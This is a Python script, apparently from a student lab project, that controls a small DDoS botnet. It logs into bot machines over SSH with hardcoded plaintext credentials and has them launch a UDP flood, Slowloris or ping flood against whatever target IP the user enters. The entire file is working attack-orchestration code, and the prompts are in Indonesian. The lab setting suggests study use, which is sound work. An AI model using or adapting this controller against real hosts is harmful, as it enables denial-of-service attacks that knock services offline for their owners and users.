from termcolor import colored
import threading
import paramiko
import sys

title = colored('''
______ ______        _____      ___   _    _                _    
|  _  \|  _  \      /  ___|    / _ \ | |  | |              | |   
| | | || | | | ___  \ `--.    / /_\ \| |_ | |_  __ _   ___ | | __
| | | || | | |/ _ \  `--. \   |  _  || __|| __|/ _` | / __|| |/ /
| |/ / | |/ /| (_) |/\__/ /   | | | || |_ | |_| (_| || (__ |   < 
|___/  |___/  \___/ \____/    \_| |_/ \__| \__|\__,_| \___||_|\_\
                                                                 
                                                                 
STARTING DDOS ATTACK 
Script DDos Attack PBL RKS-208
''', 'red', attrs=['bold'])

stop_attack = False

def ssh_execute_command(bot_ip, username, password, command):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(bot_ip, username=username, password=password)
        stdin, stdout, stderr = ssh.exec_command(command)
        stdout.channel.recv_exit_status()  # Wait for the command to complete
        print(f"\nCommand output from {bot_ip}: {stdout.read().decode()}")
        print(f"Error output from {bot_ip}: {stderr.read().decode()}")
    except paramiko.AuthenticationException:
        print(f"Authentication failed for {bot_ip}, please verify your credentials")
    except paramiko.SSHException as sshException:
        print(f"Unable to establish SSH connection to {bot_ip}: {sshException}")
    except Exception as e:
        print(f"Operation error on {bot_ip}: {e}")
    finally:
        ssh.close()

def stop_attack_listener(bots):
    global stop_attack
    while not stop_attack:
        user_input = input("Tekan 'n' untuk menghentikan serangan: ").strip().lower()
        if user_input == 'n':
            stop_attack = True
            stop_command = "sudo pkill python3"
            for bot_ip, username, password in bots:
                threading.Thread(target=ssh_execute_command, args=(bot_ip, username, password, stop_command)).start()
            print("Serangan dihentikan.")
            handle_post_attack_options()

def handle_post_attack_options():
    while True:
        print("Pilih opsi berikut:")
        print("q: Quit")
        print("b: Back to the attack selection menu")
        user_input = input("Masukkan pilihan (q/b): ").strip().lower()
        if user_input == 'q':
            sys.exit(0)
        elif user_input == 'b':
            main()
        else:
            print("Invalid option! Pilih q untuk quit atau b untuk back.")

def main():
    global stop_attack
    stop_attack = False

    attack_type_map = {
        "1": "udpflood",
        "2": "slowloris",
        "3": "pingflood"
    }

    while True:
        print("Pilih Jenis Serangan:")
        print("1: UDP Flood")
        print("2: Slowloris")
        print("3: Ping Flood")
        attack_list = input("Masukkan pilihan (1/2/3): ").strip()

        if attack_list in attack_type_map:
            attack_type = attack_type_map[attack_list]
            break
        else:
            print("Invalid! Pilih Jenis Serangan yang tersedia (1/2/3).")

    target_ip = input("Masukkan Alamat IP Target: ").strip()
    target_port = 80

    if attack_type == "slowloris":
        while True:
            total_requests_input = input("Masukkan Jumlah Total Paket (default is 500): ").strip()
            if total_requests_input == "" or total_requests_input.isdigit():
                total_requests = 500 if total_requests_input == "" else int(total_requests_input)
                break
            else:
                print("Jumlah paket harus berupa angka atau kosong untuk default (500).")

    bots = [
        ("192.168.2.10", "debian", "debian"),
        ("192.168.3.10", "debian", "debian"),
        ("192.168.4.10", "debian3", "debian3")
    ]

    while True:
        num_bots = input(f"Masukkan Jumlah Botnet yang ingin digunakan (1-{len(bots)}): ").strip()
        if num_bots.isdigit() and 1 <= int(num_bots) <= len(bots):
            num_bots = int(num_bots)
            break
        else:
            print(f"Invalid! Masukkan jumlah botnet yang tersedia antara 1 dan {len(bots)}.")

    if attack_type == "slowloris":
        print(title)
        command = f"sudo python3 Script_DDoS.py {attack_type} {target_ip} {target_port} {total_requests}"
    else:
        print(title)
        command = f"sudo python3 Script_DDoS.py {attack_type} {target_ip} {target_port}"

    listener_thread = threading.Thread(target=stop_attack_listener, args=(bots,))
    listener_thread.start()

    threads = []
    for i in range(num_bots):
        bot_ip, username, password = bots[i]
        t = threading.Thread(target=ssh_execute_command, args=(bot_ip, username, password, command))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    listener_thread.join()
    handle_post_attack_options()

if __name__ == "__main__":
    main()
